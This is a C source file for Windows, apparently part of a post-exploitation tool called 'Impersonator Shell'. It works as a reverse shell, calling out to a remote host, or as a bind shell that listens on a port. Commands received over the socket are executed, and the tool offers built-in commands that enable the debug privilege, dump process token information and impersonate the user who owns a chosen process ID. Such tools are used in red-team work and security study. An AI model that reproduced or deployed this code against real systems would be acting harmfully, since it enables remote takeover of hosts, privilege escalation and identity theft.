/*
* Author: Aleksa Zatezalo
* Date: September 2024
* Description: Functionality that acts as reverse-shell or bind-shell software.
*/

#include "doexec.h"
#include "token_info.h"

/*
* String IO Functions
*/
void Help(char *name)
{
    printf("Usage:\n");
    printf("\t-u - use udp instead of tcp\n");
    printf("\t-l - server mode, ADDRESS can be blank, default ip will be used\n");
    printf("\t-4 - force ip4\n");
    printf("\t-6 - force ip6\n\n");
    printf("\t%s [-u -4 -6] ADDRESS PORT\n", name);
    printf("\t%s -l [-u -4 -6] [ADDRESS] PORT\n", name);
    exit(0);
}

int header(int sockfd){

    /*print Impersonator*/
    char *print_this = " ~|~ _ _  _  _  _ _ _  _  _ _|_ _  _\r\n _|_| | ||_)(/_| _\\(_)| |(_| | (_)|\n        |    \n";
    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
    
    /*print Shell*/
    char *print_that = "\r\n\t\t (~|_  _ ||\n\t\t _)| |(/_||\r\n\r\nBy Aleksa Zatezalo";
    send(sockfd, print_that, sizeof(char) * strlen(print_that), 0);

    return 0;
}

int command_prompt(int sockfd){

    /*print Impersonator*/
    char *print_this = "\n[Impersonator Shell]> ";
    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
    
    return 0;
}

int welcomeMessage(int sockfd){
    header(sockfd);
    command_prompt(sockfd);
}

/*
* Handle user input functions.
*/

char *handleInput(char *input){
    char *result;
    if (strstr(input, "help")){
        result = "Type `help` for help\r\nType `token-info PID` to get token info for process with process ID PID\r\nType `enable-debug` to enable the debug privilege.\r\nType `impersonate PID` to impersonate a PID's associated user\r\n";
    } else if (strstr(input, "enable-debug") != NULL) {
        result = EnableDebugPrivilege();
    } else if (strstr(input, "impersonate") != NULL) {
        char *command = strtok(input, " "); //first_part points to "impersonate"
        int token = atoi(strtok(NULL, " "));   //sec_part points to "token"
        result = Impersonate(token);
    } else if (strstr(input, "token-info") != NULL){
        char *command = strtok(input, " "); //first_part points to "token-info"
        int token = atoi(strtok(NULL, " "));   //sec_part points to "token"
        result = PrintUserInfoFromToken(token);
    } else {
        result = doexec(input, TRUE);
    }

    return result;
}

/*
* Client server funcitons.
*/
int server(int port){
    WSADATA WSAData;
    SOCKET server, client;
    SOCKADDR_IN serverAddr, clientAddr;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);

    bind(server, (SOCKADDR *)&serverAddr, sizeof(serverAddr));
    listen(server, 0);

    char buffer[1024];
    int clientAddrSize = sizeof(clientAddr);
    client = accept(server, (SOCKADDR *)&clientAddr, &clientAddrSize);
    welcomeMessage(client);
    while (recv(client, buffer, sizeof(buffer), 0) > 0) {
        char *ans = handleInput(buffer);
        send(client, ans, strlen(ans) * sizeof(char) + 1,0);
        command_prompt(client);
        memset(buffer, '\0', sizeof(buffer));
        free(ans);
    }

    return 0;
}

int client(char *rhost, int port){
    WSADATA wsa;
    SOCKET s, client;
    struct sockaddr_in server;

    
    WSAStartup(MAKEWORD(2,2),&wsa);
    s = socket(AF_INET , SOCK_STREAM , 0 );
    server.sin_addr.s_addr = inet_addr(rhost);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    client = connect(s, (struct sockaddr *)&server , sizeof(server));
    welcomeMessage(s);
    char buffer[1024];
    while (recv(s, buffer, sizeof(buffer), 0) > 0) {
        char *ans = handleInput(buffer);
        send(s, ans, strlen(ans) * sizeof(char),0);
        command_prompt(s);
        memset(buffer, '\0', sizeof(buffer));
        free(ans);
    }
    return 0;
}